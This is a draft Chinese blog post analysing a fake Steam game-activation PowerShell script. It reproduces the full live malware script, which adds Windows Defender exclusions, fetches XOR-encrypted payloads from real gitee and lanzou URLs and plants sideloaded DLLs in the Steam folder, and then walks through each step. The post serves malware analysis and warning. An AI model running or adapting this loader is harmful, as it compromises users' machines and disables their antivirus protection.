---
draft: true
date:
  created: 2026-03-20
  updated: 2026-03-21
categories:
  - 🔍 RE
slug: "Steam-FakeAuth-RE"
---

# 利用 Powershell 脚本的 Steam 假入库样本分析

在某宝上购买了非常便宜的游戏激活码，客服要求在终端执行 `irm xxx.com | iex` 进行激活

明眼人都知道这是经典的 Steam 假入库，但是这背后的原理是什么呢🤔

<!-- more -->

---

???+ warning "前排提醒"

    以下出现的部分代码内容**来自真实的 Malware 脚本 / 程序**，并且没有对有害部分进行处理
    
    **永远不要在实机上测试，你已经被警告过了**

## Intro. Powershell

`irm xxx.com | iex` 会获取并执行脚本，不妨 `irm xxx.com | tee -FilePath "E:\Shared\Programs\malware.ps1"` 获取脚本，看一看脚本都干了什么事

??? quote "先把完整的代码放在这里，**不要尝试运行这个脚本**"

    ```powershell title="malware.ps1"
    Clear-Host
    #Requires -RunAsAdministrator
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $ErrorActionPreference = "SilentlyContinue"
    
    # 这里是非常炫酷的 Write-Host -NoNewline 打印 Steam Logo 字符画，略过不看了
    
    function Get-DownloadUrl {
        param (
            [string]$fid,
            [string]$p = $null
        )
        try {
            $baseUrl = 'https://lanzoup.com'
            $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
        }
        catch {
            $baseUrl = 'https://lanzoui.com'
            $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
        }
        $content = $response.Content
        $locUrl = [regex]::Match($content, 'window.location.href="(.*?)";').Groups[1].Value
        if ($locUrl) {
            $response = Invoke-WebRequest -UseBasicParsing -Uri $locUrl -Headers @{ 'User-Agent' = '' }
            $content = $response.Content
        }
        $iframeUrl = [regex]::Match($content, 'class="ifr2".+?src="(.*?)"').Groups[1].Value
        if ($iframeUrl) {
            $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl$iframeUrl" -Headers @{ 'User-Agent' = '' } -Method Post
            $content = $response.Content
            $sign = [regex]::Match($content, "var wp_sign = '(.*?)';").Groups[1].Value
        }
        else {
            $sign = [regex]::Match($content, "var skdklds = '(.*?)';").Groups[1].Value
        }
        if (-not$sign) {
            return
        }
        $urlMatch = [regex]::Match($content, "url : '(.*?file=\d{2,})',").Groups[1].Value
        if (-not$urlMatch) {
            return
        }
        $headers = @{
            'User-Agent' = ''
            'Referer'    = $response.BaseResponse.ResponseUri.AbsoluteUri
        }
        $body = @{ 'action' = 'downprocess'; 'sign' = $sign; 'kd' = 1 }
        if ($null -ne $p) {
            $body['p'] = $p
        }
        $response = Invoke-RestMethod -Uri "$baseUrl$urlMatch" -Headers $headers -Method Post -Body $body
        if ($null -eq $response) {
            return
        }
        $dom = $response.dom
        if (-not$dom) {
            return
        }
        $downloadUrl = $response.url
        if (-not$downloadUrl) {
            return
        }
        return "$dom/file/$downloadUrl"
    }
    
    function Invoke-WithRetry {
        param(
            [scriptblock]$ScriptBlock,
            [int]$MaxRetries = 10,
            [int]$DelaySeconds = 1
        )
        $retryCount = 0
        while ($retryCount -lt $MaxRetries) {
            try {
                return & $ScriptBlock
            }
            catch {
                $retryCount++
                if ($retryCount -ge $MaxRetries) {
                    throw $_
                }
                Start-Sleep -Seconds $DelaySeconds
            }
        }
    }
    
    function DownloadFile {
        param(
            [string]$url,
            [string]$savePath,
            [string]$hash,
            [string]$targetPath,
            [string]$fid
        )
        if (-not$targetPath) {
            $targetPath = $savePath
        }
        if ((Test-Path $targetPath) -and ((Get-FileHash -Path $targetPath -Algorithm MD5).Hash -eq $hash)) {
            return
        }
        if (Test-Path $savePath) {
            Remove-Item -Path $savePath -Force -ErrorAction Stop
        }
        Add-Type -TypeDefinition "using System.IO;public class XorUtil{public static void XorFile(string p,byte key){var b=File.ReadAllBytes(p);for(int i=0;i<b.Length;i++)b[i]^=key;File.WriteAllBytes(p,b);}}";
        $urls = @()
        if ($fid) {
    
            try {
                $urls += (Get-DownloadUrl -fid $fid)
            }
            catch {
            }
        }
        $urls += $url
        $err = $null
        Invoke-WithRetry -ScriptBlock {
            foreach ($url in $urls) {
                try {
                    $job = Start-Job -ScriptBlock {
                        param($url, $savePath)
                        Invoke-RestMethod -Uri $url -Headers @{ 'Accept-Language' = 'zh-CN' } -OutFile $savePath -ErrorAction Stop
                    } -ArgumentList $url, $savePath
                    $job | Wait-Job -Timeout 30 | Out-Null
                    if ($job.State -eq "Running") {
                        $job | Stop-Job -PassThru | Remove-Job -Force
                        throw "下载超时"
                    }
                    [XorUtil]::XorFile($savePath, 0x42)
                    return
                }
                catch {
                    $err = $_
                }
            }
            if (-not($null -eq $err)) {
                throw $err
            }
        }
    }
    
    function Test-Is64Bit {
        param(
            [Parameter(Mandatory = $true)]
            [ValidateScript({ Test-Path $_ -PathType Leaf })]
            [string]$FilePath
        )
    
        try {
            $bytes = [System.IO.File]::ReadAllBytes($FilePath)
            if ($bytes.Length -lt 64) { return $false }
    
            $peOffset = [System.BitConverter]::ToInt32($bytes, 0x3C)
            if ($peOffset -ge $bytes.Length - 2) { return $false }
    
            if (
                $bytes[$peOffset] -ne 0x50 -or 
                $bytes[$peOffset + 1] -ne 0x45 -or 
                $bytes[$peOffset + 2] -ne 0x00 -or 
                $bytes[$peOffset + 3] -ne 0x00
            ) {
                return $false
            }
    
            return [System.BitConverter]::ToUInt16($bytes, $peOffset + 4) -in @(0x8664, 0x200, 0xAA64)
        }
        catch {
            return $false
        }
    }
    
    # 以下是主逻辑
    
    try {
    
        $filePathToDelete = "a.ps1"
        if (Test-Path $filePathToDelete) {
            Remove-Item -Path $filePathToDelete -Force
        }
    
        Write-Host ""
        Write-Host ""
        Write-Host "  [STEAM] 激活进程准备中，请稍候..."
    
        $steamRegPath = 'HKCU:\Software\Valve\Steam'
        $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
        if ($null -eq $steamPath) {
            Write-Host "  [STEAM] Steam 可能没有正确安装，请重新安装 Steam 后再试" -ForegroundColor Red
            exit
        }
        $exePath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamExe').SteamExe
        $is64Bit = Test-Is64Bit -FilePath $exePath
        $exePid = (Get-ItemProperty -Path ($steamRegPath + "\ActiveProcess") -Name 'pid').pid
        if ($null -ne $exePid) {
            Stop-Process -Id $exePid -ErrorAction SilentlyContinue
        }
        $registryPath = "HKCU:\Software\Valve\Steamtools"
        if (-not(Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force | Out-Null
        }
        Set-ItemProperty -Path $registryPath -Name "packageinfo" -Value "" | Out-Null
        Set-ItemProperty -Path $registryPath -Name "steamclient" -Value "" | Out-Null
        Set-ItemProperty -Path $registryPath -Name "s" -Value "398a2323a3433bfb0aff3d45e27a379200" | Out-Null
        Remove-ItemProperty -Path $registryPath -Name "c" | Out-Null
        if (Test-Path "env:c") {
            Set-ItemProperty -Path $registryPath -Name "c" -Value $env:c -Type DWORD | Out-Null
        }
    
        $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
        $runningProcess | ForEach-Object {
            Stop-Process $_ -Force
        }
    
        if (-not$( [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') )) {
            Write-Host "  [STEAM] 请使用管理员模式运行" -ForegroundColor Red
        }
    
        $targetDirectory = "$env:APPDATA\Stool"
        if (-not(Test-Path $targetDirectory)) {
            New-Item -Path $targetDirectory -ItemType Directory | Out-Null
        }
        try {
            $acl = Get-Acl $targetDirectory
            $acl.Access | Where-Object { $_.AccessControlType -eq 'Deny' } | ForEach-Object { [void] $acl.RemoveAccessRule($_) }
            Set-Acl $targetDirectory $acl -ErrorAction Stop
        }
        catch {
            Write-Host "  [STEAM] $_" -ForegroundColor Red
        }


        $waitTimes = 10
        while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }) {
            Start-Sleep -Seconds 1
            $waitTimes--
            if ($waitTimes -lt 0) {
                break
            }
        }
    
        #    $ProgressPreference = 'SilentlyContinue'
        if ($is64Bit) {
            $savePathZip = Join-Path $targetDirectory "legit64"
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/64/legit64' -savePath $savePathZip -hash '95ACEB4C9BD424CC3D8BE911323A3159' -fid 'i4QsZ3ks6h9e'
        }
        else {
            $savePathZip = Join-Path $targetDirectory "legit"
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/legit' -savePath $savePathZip -hash '9B2FF8684E3C886C8FCDF83053D28F35' -fid 'iS21a3gyx7nc'
        }
    
        $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
        $savePathTxt1 = Join-Path $targetDirectory "winhttp-log1.txt"
    
        if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" }) {
            try {
                Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
                Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
            }
            catch {
            }
            Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
        }
        else {
            Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
        }
    
        if ($is64Bit) {
            $configDirectory = Join-Path $steamPath "config"
            $savePathVdf = Join-Path $configDirectory "appdata.vdf"
    
            if (-not(Test-Path $configDirectory)) {
                New-Item -Path $configDirectory -ItemType Directory -ErrorAction Stop | Out-Null
            }
    
            $steamTxt = Join-Path $steamPath "dwmapi.log"
            $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
            $steamTxt1 = Join-Path $steamPath "xinput1_4.log"
            $d_path1 = [System.IO.Path]::ChangeExtension($steamTxt1, ".dll")
    
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/64/1/appdata.vdf' -savePath $savePathVdf -hash 'D503089A6EE3FA581960C7DEB76EC406' -fid 'iGwMP3gyx8lg'
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/64/1/dwmapi.dll' -savePath $savePathTxt -hash 'AAB5D9A81338625EEFE27405EE4784D1' -targetPath $d_path -fid 'ich0k3jgc0cd'
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/64/1/dwmapi.dll' -savePath $savePathTxt1 -hash 'AAB5D9A81338625EEFE27405EE4784D1' -targetPath $d_path1 -fid 'ich0k3jgc0cd'
    
            $filePath = Join-Path $steamPath "steam.cfg"
            if (Test-Path $filePath) {
                Remove-Item $filePath -Force
            }
        }
        else {
            $localSteamDirectory = Join-Path $env:LOCALAPPDATA "Steam"
            $savePathVdf = Join-Path $localSteamDirectory "localData.vdf"
    
            if (-not(Test-Path $localSteamDirectory)) {
                New-Item -Path $localSteamDirectory -ItemType Directory -ErrorAction Stop | Out-Null
            }
    
            $steamTxt = Join-Path $steamPath "hid.log"
            $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
    
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/1/localData.vdf' -savePath $savePathVdf -hash '6D4A87B255A30198DF09F71DE56D45B8' -fid 'iNRTq3gyx8id'
            DownloadFile -url 'https://gitee.com/huooee887/aa/raw/master/1/hid.dll' -savePath $savePathTxt -hash '27211F8430BF0DBDE26CA376F1A6CFDE' -targetPath $d_path -fid 'i1LZj3gyx8gb'
        }
    
        foreach ($file in @("version.dll", "user32.dll", "wtsapi32.dll")) {
            $filePath = Join-Path $steamPath $file
            if (Test-Path $filePath) {
                Remove-Item $filePath -Force
            }
        }
    
        if (Test-Path $savePathTxt) {
            Move-Item -Path $savePathTxt -Destination $steamTxt -Force -ErrorAction Stop
            if (Test-Path $savePathTxt) {
                Remove-Item $savePathTxt -Force
            }
    
            if (Test-Path $d_path) {
                Remove-Item $d_path -Force -ErrorAction Stop
            }
            Rename-Item -Path $steamTxt -NewName $d_path -Force -ErrorAction Stop
        }
    
        if (Test-Path $savePathTxt1) {
            Move-Item -Path $savePathTxt1 -Destination $steamTxt1 -Force -ErrorAction Stop
            if (Test-Path $savePathTxt1) {
                Remove-Item $savePathTxt1 -Force
            }
    
            if (Test-Path $d_path1) {
                Remove-Item $d_path1 -Force -ErrorAction Stop
            }
            Rename-Item -Path $steamTxt1 -NewName $d_path1 -Force -ErrorAction Stop
        }
    
        try {
            $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
            if (Test-Path $loginUsersPath) {
                (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode"\s+)("\d+")', "`$1`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
            }
    
            $configPath = Join-Path $steamPath "config\config.vdf"
            if (Test-Path $configPath) {
                (Get-Content $configPath -Encoding UTF8) -replace '("DisableShaderCache"\s+)("\d+")', "`$1`"1`"" | Set-Content $configPath -Encoding UTF8
            }
        }
        catch {
        }
    
        if (-not(Test-Path $exePath)) {
            $exePath = Join-Path $steamPath "steam.exe"
        }
    
        if (Test-Path $exePath) {
            Invoke-Expression -Command "start steam://open/activateproduct"
        }
        else {
            Write-Host "  [STEAM] 主进程 $exePath 丢失，安装失败"
            exit
        }
    
        Write-Host "  [STEAM] 激活进程准备就绪，Steam 打开中，请稍候..."
    
        for ($i = 9; $i -ge 0; $i--) {
            Write-Host "`r  [STEAM] 本窗口将在 $i 秒后关闭..." -NoNewline
            Start-Sleep -Seconds 1
        }
    
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$( $instance.ParentProcessId )'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }
    
        exit
    }
    catch {
        Write-Host "发生错误($( $_.InvocationInfo.ScriptLineNumber ))：$( $_.Exception.Message )" -ForegroundColor Red
    }
    ```

大致过一遍整个脚本的流程，如果感觉太没意思的话可以直接往下看结果

- 首先 `#Requires -RunAsAdministrator` 要求管理员权限，并且 `$ErrorActionPreference = "SilentlyContinue"` 静默所有错误显示。然后找到并删除 `a.ps1` 文件（应该是旧残留）
- 翻注册表 `HKCU:\Software\Valve\Steam` 找有没有 `SteamPath` `SteamExe` 的字段，确认电脑上有 Steam，然后强制关闭 Steam
- 创建 `HKCU:\Software\Valve\Steamtools`，添加字段 `packageinfo` 和 `steamclient` 为空白，字段 `s` 为哈希值 `398a2323a3433bfb0aff3d45e27a379200`，删除字段 `c` 并检查环境变量中有没有 `c`，如果有则将值写入注册表（`c` 是一个 DWORD）
- 创建 `%APPDATA%\Stool` 文件夹并开放权限
- 此时会再检测一次管理员权限，并且持续检查 Steam 进程有没有完全终止
- 脚本开始正式动手，根据系统是 64 位 or 32 位下载程序，这里以 64 位为例：从 `https://gitee.com/huooee887/aa/raw/master/64/legit64` 上下载 `legit64` 程序，保存到 `%APPDATA%\Stool`，同时还预备了蓝奏云的备用下载链接。下载后进行 MD5 校验。
    - 同时下载下来的 `legit64` 是异或加密的，需要用 `0x42` 解密
- 将 Steam 目录和 `%APPDATA%\Stool` 目录中的所有 `.exe` `.dll` 文件加入 Windows Defender 白名单
- 准备两个临时的文件路径，后期用于写入 DLL 文件

- 在 Steam 文件夹下创建 `config` 目录，在 `config` 目录下通过 `https://gitee.com/huooee887/aa/raw/master/64/1/appdata.vdf` 下载恶意配置文件 `appdata.vdf`
- 继续从 `https://gitee.com/huooee887/aa/raw/master/64/1/dwmapi.dll` 下载恶意 DLL 文件，异或 `0x42` 解密，MD5 校验。这个文件最终被下载两次，分别命名为 `dwmapi.dll` 和 `xinput1_4.dll` 覆盖移动到 Steam 目录。中途这两个文件被命名为日志文件，很难监控
- 删除 Steam 目录下的 `steam.cfg` `version.dll` `user32.dll` `wtsapi32.dll`，后面三个应该也是其他来源的恶意 DLL，说不定是同行恶性竞争
- 通过修改 `config\loginusers.vdf` 配置文件打开 Steam 在线模式；通过修改 `config\config.vdf` 配置文件禁用着色器缓存
- 启动 Steam，强制结束脚本父进程，最终自己退出

---

经过这一番操作，电脑上最终会多出 / 被修改的核心文件包括：

1. `%APPDATA%\Stool\legit64`
2. `%SteamPath%\dwmapi.dll`
3. `%SteamPath%\xinput1_4.dll`（和 `dwmapi.dll` 内容相同）
4. `%SteamPath%\Steam\config\appdata.vdf`

以及一些注册表项修改，Defender 白名单修改

初步分析一下，`legit64` 应该是主恶意程序，DLL 文件应该是引导项，VDF 文件没见过，STFW 发现是 "The Vavle Data File"，应该是配置相关

继续搜索一下，发现 [SteamTools](https://www.steamtools.net/) 这个网站，其注入流程 `irm steam.run | iex` 和上文几乎一致

